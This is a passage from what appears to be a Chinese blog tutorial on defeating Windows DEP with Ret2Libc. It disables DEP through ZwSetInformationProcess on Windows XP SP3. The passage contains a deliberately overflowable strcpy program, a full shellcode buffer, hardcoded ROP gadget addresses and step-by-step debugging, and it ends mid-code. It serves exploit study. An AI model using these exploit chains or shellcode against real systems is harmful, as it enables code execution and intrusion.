Option状态，只保护系统核心进程，而经过 /NXCOMPAT 编译的程序在 Windows vista及后续版本中会<strong>自动启用 DEP 保护</strong>。</p><h2 id="dep的局限"><a class="markdownIt-Anchor" href="#dep的局限"></a> <strong>DEP的局限：</strong></h2><p>（1）硬件 DEP 需要 CPU 支持。<br>（2）由于兼容性，windows 不能对所有进程开启 DEP 保护。<br>（3）/NXCOMPAT 编译选项，或者是 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 的设置，只对 windows vista 以上的系统有效。<br>（4）当 DEP 工作在 Option 和 Optout 下时，DEP 是可以被动态关闭和开启的，这就说明操作系统提供了某些 API 函数控制 DEP状态。早期的 API 调用没有任何限制。</p><h1 id="攻击未启用-dep-的程序"><a class="markdownIt-Anchor" href="#攻击未启用-dep-的程序"></a> 攻击未启用 DEP 的程序</h1><p>DEP 保护对象是进程级的，当某个进程的加载模块中只要有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。在此不做讨论。</p><h1 id="利用-ret2libc-挑战-dep"><a class="markdownIt-Anchor" href="#利用-ret2libc-挑战-dep"></a> 利用 Ret2Libc 挑战 DEP</h1><p>在 DEP 保护下溢出失败的根本原因是 DEP 检测到程序转到非可执行页执行指令了，如果让程序跳转到一个已经存在的系统函数中（必然处于可执行页上），DEP是不会拦截的。</p><p>Ret2Libc 是 Return-to-llibc 简写，只要为 shellcode 中的每条指令都在代码区找到一条替代指令，就能完成 exploit 想要的功能了。但这仅仅是理论上可行，实际上操作难度极大。</p><h2 id="绕过-dep-的-exploit-方法"><a class="markdownIt-Anchor" href="#绕过-dep-的-exploit-方法"></a> 绕过 DEP 的 exploit 方法：</h2><p>（1）通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618171923634-16562939498343.png" alt="image-20220618171923634"></p><p>（2）通过跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态，然后再转入 shellcode 执行。<br>（3）通过跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复制到这段内存中执行。</p><h3 id="ret2libc-实战之利用-zwsetinformationprocess"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-zwsetinformationprocess"></a> Ret2Libc 实战之利用 ZwSetinformationProcess</h3><p>将进程 DEP 保护关闭。</p><p>一个进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API 函数 ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</p><blockquote><p>题外话： 在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformation Process，在 Ntdll.dll 中 Nt<strong>函数和 Zw</strong>函数功能是完全一样的，本书中我们统一称之为 Zw**。</p></blockquote><p>_KEXECUTE_OPTIONS 的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KEXECUTE_OPTIONS</span><br><span class="line">Pos0ExecuteDisable :1bit</span><br><span class="line">Pos1ExecuteEnable :1bit</span><br><span class="line">Pos2DisableThunkEmulation :1bit</span><br><span class="line">Pos3Permanent :1bit</span><br><span class="line">Pos4ExecuteDispatchEnable :1bit</span><br><span class="line">Pos5ImageDispatchEnable :1bit</span><br><span class="line">Pos6Spare :2bit</span><br></pre></td></tr></table></figure><p>前4个 bit 与 DEP 相关，当前进程 DEP 开启时 ExecuteDisable 位被置 1，当进程 DEP 关闭时 ExecuteEable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的，Permanent 被置 1 后表示这些标志都不能再被修改。</p><p>函数 NtSetInformationProcess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZwSetInformationProcess(</span><br><span class="line">IN HANDLE ProcessHandle,</span><br><span class="line">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span><br><span class="line">IN PVOID ProcessInformation,</span><br><span class="line">IN ULONG ProcessInformationLength );</span><br></pre></td></tr></table></figure><p>第一个参数为进程的句柄，设置为-1 的时候表示为当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS，第四个参数为第三个参数的长度。</p><p>关闭 DEP 的参数设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line">ZwSetInformationProcess(</span><br><span class="line">NtCurrentProcess(), // (HANDLE)-1</span><br><span class="line">ProcessExecuteFlags, // 0x22</span><br><span class="line">&amp;ExecuteFlags, // ptr to 0x2</span><br><span class="line">sizeof(ExecuteFlags)); // 0x4</span><br></pre></td></tr></table></figure><p>函数的参数中包含 0x00，会造成字符串复制时被截断。既然自己构造参数会出问题，那么就在系统中寻找已经构造好的参数。</p><p>如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的 DEP 会被关闭：<br>（ 1）当 DLL 受 SafeDisc 版权保护系统保护时；<br>（ 2）当 DLL 包含有.aspcak、 .pcle、 .sforce 等字节时；<br>（ 3） Windows Vista 下面当 DLL 包含在注册表“ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions ”键下边标识出不需要启动 DEP 的模块时。</p><p>在 Windows XP SP3 下 LdrpCheckNXCompatibility 关闭 DEP 的具体流程，以 SafeDisc 为例，如下图：</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618173743193-16562939498344.png" alt="image-20220618173743193"></p><p>模拟 LdrpCheckNXCompatibility 关闭 DEP 的流程，先想办法将 AL 赋值为1，然后转入执行 0x7C93CD24（CMP AL,1） 及后续指令来关闭 DEP，代码如下。</p><h4 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x52\xE2\x92\x7C&quot;</span><span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">    <span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x19\x4A\x97\x7C&quot;</span><span class="comment">//增大 ESP</span></span><br><span class="line">    <span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x24\xCD\x93\x7C&quot;</span><span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">    <span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span><span class="comment">//回跳指令</span></span><br><span class="line">    <span class="string">&quot;\xFF\x90\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，在实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）将函数的返回地址覆盖为类似 MOV AL,1 retn 的指令，在将 AL 置 1 后转入 0x7C93CD24 关闭 DEP。<br>（ 4）DEP 关闭后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h4><p><strong>（ 1）将 AL 置为 1，后执行关闭 DEP 指令。</strong></p><p>找到类似 MOV AL,1 RETN 的指令。OllyFindAddr 插件的 Disable DEP —&gt; Disable DEP &lt;= XP SP3 搜索结果的 Step2 就是符合要求的指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619135451210-16562939498345.png" alt="image-20220619135451210"></p><p>为避免 shellcode 在复制时被截断，需选择一个不包含 0x00 的地址，使用 0x7C92E252 覆盖函数的返回地址，让函数执行完后将 AL 置 1，然后返回控制流程。</p><p>先用小于 200 个0x90填充 shellcode，找出 tt[0] 的地址（0x0012FDB0)。然后在分析栈，找出 test() 的返回地址（0x0012FE64），来确定 shellcode 的长度为 184字节，shellcode 内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>调试运行，在 0x7C92E257（retn）处暂停程序，查看堆栈 ESP=0012FE68，指向 test() 返回地址下方，retn 将返回到 ESP 指向的内存空间（0x7C930200)。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619162125082-16562939498346.png" alt="image-20220619162125082"></p><p>所以我们要在 0x0012FE68 放上 0x7C93CD24（cmp al,1），来让程序转入关闭 DEP 流程，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><strong>（2）产生异常，EBP 指向位置无法写入，解决问题</strong></p><p>重新编译程序，在 0x7C93CD6F，即关闭 DEP 后的 retn 4 处下断点，然后运行。程序运行后，出现了异常，如下图。程序对 EBP-4 位置写入数据，但是 EBP 在溢出时候被破坏了，目前 EBP-4 为 90909090 不可写入，所以程序出现写入异常，在转入 0x7C93CD24 前我们需要将 EBP 指向一个可写的位置。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619172626766-16562939498347.png" alt="image-20220619172626766"></p><p>通过类似 PUSH ESP POP EBP RETN 的指令将 EBP 定位到一个可写的位置，用 OllyFindAddr 插件可在 Disable DEP &lt;= XP SP3 搜索结果的 Setp3 部分查看当前内存所有符合条件的指令，如下图所示。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619180931685-16562939498348.png" alt="image-20220619180931685"></p><p>现在，筛选出合适指令，找出可写入而不影响后续指令的寄存器，显然，PUSH ESP POP EBP RETN 指令需要放在 <code>mov al,1</code> 之后，在关闭 DEP 之前。而不影响关闭 DEP 的寄存器只有 ESP，所以选择 PUSH ESP POP EBP RETN 指令序列。</p><p><strong>（3）消除 EBP-4 被冲刷影响，修正 EBP</strong></p><p>现在还有一个严重的问题，直接将 ESP 的值赋给 EBP 返回后， ESP 相对 EBP 位于高址位置，当有入栈操作时 EBP-4 处的值可能会被冲刷掉，进而影响传入 ZwSetInformationProcess 的参数，造成 DEP 关闭失败。我们先用 0x5D1D8B85 处的 PUSH ESP POP EBP RET 4 指令来修正 EBP，然后调试根据堆栈情况来消除 EBP-4 被冲刷的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>重新编译程序后调试，在 0x7C95683B 处（CALL ZwSetInformationProcess）下断点，待程序中断后观察堆栈情况。如下图所示，EBP-4 中的内容已经被覆盖为 0x22，根据_KEXECUTE_OPTIONS 结构我们知道 DEP 只和结构中的前 4 位有关，只要前 4 位的二进制代码为 0100 就可关闭 DEP，而 0x22（00100010）刚刚符合这个要求，所以用 0x22 冲刷掉 EBP-4 处的值还是可以关闭 DEP 的。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/../Blog_rgzz/source/_posts/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620081243474.png" alt="image-20220620081243474"></p><p>虽然我们已经关闭了 DEP，但是我们失去了进程的控制权。我们再来看看关闭 DEP 后程序返回时堆栈的情况。单步运行到 0x7C93CD6F 处（retn 4），发现 ESP 指向 0x0012FE70，此处值为 0x00000004，它就是关闭 DEP 时 PUSH 4 的结果，现在我们无法转入 shellcode 执行了，所以我们还需要对 ESP 或者 EBP 进行调整。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620082759710-16562939498349.png" alt="image-20220620082759710"></p><p><strong>（4）夺回程序控制权</strong></p><p>ESP 值小于 EBP 时，防止入栈时破坏当前栈内容的调整方法就是减小 ESP和增大 EBP。由于 shellcode 位于内存低址，所以减小 ESP 会破坏 shellcode，而增大 EBP 的指令在本次实验中无法找到。一个变通方法是增大 ESP 到一个安全的位置，让 EBP 和 ESP 之间的空间足够大，这样关闭 DEP 过程中的压栈操作就无法冲刷到 EBP 的范围内了。</p><p>我们可以使用带有偏移量的 RETN 指令来增大 ESP，如 RETN 0x28 等指令可以执行 RETN 指令后再将 ESP 增加 0x28 个字节。我们可以通过 OllyFindAddr 插件中的 Overflow return address --&gt; POP RETN+N 选项来查找相关指令。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620084553195-16556859539081-165629394983410.png" alt="image-20220620084553195"></p><p>在选取指令时，不能对 ESP 和 EBP 有直接操作。否则会无法跳回 shellcode 执行。选择 0x7C974A19 处的 RETN 28，来增大 ESP。在关闭 DEP 前加入增大 ESP 指令地址。注意：修正 EBP 指令返回时带有的偏移量回影响后续指令，所以我们在布置 shellcode 时需加入相应填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在 0x7C93CD6F 处中断程序，建议不要在加载完程序直接在 0x7C93CD6F 中断，先在 0x7C95683B（CALL ZwSetInformationProcess）处下断点，然后单步运行到 0x7C93CD6F，否则您会被中断到崩溃。堆栈情况如下图，增大 ESP 后关键数据没有被破坏。执行完 RETN 0x04 后 ESP 将指向 0x0012FE74，所以我们只要在 0x0012FE70 放置一条 JMP ESP 指令就能让程序转入堆栈执行指令。通过 OllyFindAddr 插件中的 Overflow return address --&gt; Find CALL/JMP ESP 来搜索指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620120052278-165629394983411.png" alt="image-20220620120052278"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620121426020-165629394983412.png" alt="image-20220620121426020"></p><p>用 0x7DC5C1B4 处的 JMP ESP，然后在 0x0012FE70 处放一个长跳指令，让程序跳转到 shellcode 的起始位置来执行 shellcode，根据内存状态，可以计算处 0x0012FE74 距离 shellcode 起始位置（0x0012FDB0）有 200 个字节，所以需要回调 205个字节（+5 字节跳转指令长度）。</p><p>布置 shellcode，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620123304414-165629394983413.png" alt="image-20220620123304414"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span> <span class="comment">//回跳指令</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br></pre></td></tr></table></figure><p>将 shellcode 布置好后重新编译运行，调试，在 0x7C93CD6F 处下断点，然后单步运行，观察 程序执行流程。执行完 JMP ESP 后就能看到程序转入 shellcode。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131557944-165629394983414.png" alt="image-20220620131557944"></p><p>继续运行就能看到对话框了。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131754734-165629394983415.png" alt="image-20220620131754734"></p><h4 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充：</h4><p>微软在 Windows 2003 SP2 以后对 LdrpCheckNXCompatibility 函数进行了少许修改，对我们影响最大的是该函数在执行过程中会对 ESI 指向的内存附近进行操作。保证 ESI 指向的内存为可写内存，利用类似的指令如 push esp pop esi retn 来调整 ESI，这些指令显示在 OllyFindAddr 插件中 Disable DEP→Disable DEP &gt;=2003 SP2 搜索结果的 step4 部分。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620145822498-165629394983516.png" alt="image-20220620145822498"></p><p>这些指令不好找，这里介绍一种替代方法：</p><p>（ 1）找到 pop eax retn 指令，并让程序转入该位置执行。<br>（ 2）找到一条 pop esi retn 的指令，并保证在执行（ 1）中 pop eax 时它的地址位于栈顶，这样就可以把该地址放到 eax 中。<br>（ 3）找到 push esp jmp eax 指令，并转入执行。<br>这样就相当于执行了 push esp pop esi retn， esi 被指到了可写位置。下边我们给出一种可以在 Windows 2003 SP2 下边成功溢出的代码，大家可以自行调试，感受一下跳板执行选取和 shellcode 布局的思路。代码运行环境为 Windows 2003 SP2 中文版，代码中的各跳板地址可能需要重新调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 